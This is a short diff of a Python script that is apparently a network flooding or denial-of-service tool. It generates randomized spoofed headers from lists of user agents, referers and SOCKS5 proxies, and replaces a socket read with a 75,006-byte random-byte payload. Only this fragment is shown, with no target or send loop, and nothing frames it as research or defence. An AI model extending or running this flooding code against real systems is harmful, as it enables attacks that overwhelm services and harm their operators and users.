@@ -158,9 +158,9 @@ def start2():
   
 def start():
   global useragents, acceptall, ref, socks5
+  global data2
   time.sleep(0.01)
-  data2 = client_socket.recv(23410)
-  hh = random._urandom(75006)
+  data2 = random._urandom(75006)
   xx = int(0)
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
